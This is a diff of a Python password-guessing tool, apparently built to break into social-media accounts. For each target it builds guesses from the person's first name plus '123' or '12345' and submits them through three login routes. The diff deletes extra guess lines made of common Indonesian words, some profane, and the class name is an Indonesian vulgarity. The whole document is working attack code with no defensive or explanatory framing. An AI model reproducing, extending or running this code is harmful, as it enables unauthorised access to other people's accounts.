@@ -292,18 +292,8 @@ class ngentod:
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"bajingan"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"bajingan"]
                         log.submit(self.b_api, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
@@ -318,18 +308,8 @@ class ngentod:
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"bajingan"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"bajingan"]
                         log.submit(self.basic, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
@@ -344,18 +324,8 @@ class ngentod:
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"bajingan"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"bajingan"]
                         log.submit(self.mobil, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
